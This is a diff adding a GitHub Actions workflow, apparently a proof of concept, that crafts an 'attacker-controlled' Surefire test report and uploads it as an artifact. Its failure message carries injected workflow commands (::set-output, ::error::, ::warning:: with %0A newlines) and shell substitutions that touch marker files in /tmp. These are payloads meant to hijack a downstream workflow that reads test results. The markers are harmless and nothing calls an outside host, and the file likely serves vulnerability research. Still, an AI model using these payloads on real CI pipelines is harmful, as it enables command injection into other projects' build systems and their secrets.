@@ -1,0 +1,37 @@
+name: OpenAPI Generator
+
+on:
+  push:
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft attacker-controlled surefire report
+        run: |
+          mkdir -p out/surefire-reports
+          cat > out/surefire-reports/TEST-inj.xml <<'XML'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <testsuites time="1.5">
+            <testsuite name="poc.Suite" tests="2" failures="1" time="1.5">
+              <testcase classname="poc.Suite" name="probe" time="0.1">
+                <failure message="INJ ::set-output name=INJ_VAR::pwned %0A::error::injected-by-artifact" type="java.lang.RuntimeException">java.lang.RuntimeException: INJ ::set-output name=INJ_VAR::pwned
+          	at poc.Suite.probe(Suite.java:42)
+          $(touch /tmp/pwned-by-artifact)
+          `touch /tmp/pwned-backtick`
+          ::warning::injected-warning
+          </failure>
+              </testcase>
+              <testcase classname="poc.Suite" name="ok" time="0.1"/>
+            </testsuite>
+          </testsuites>
+          XML
+          sed -i 's/^          //' out/surefire-reports/TEST-inj.xml
+          echo "--- payload:"; cat out/surefire-reports/TEST-inj.xml
+      - uses: actions/upload-artifact@v4
+        with:
+          name: surefire-test-results
+          path: '**/surefire-reports/TEST-*.xml'
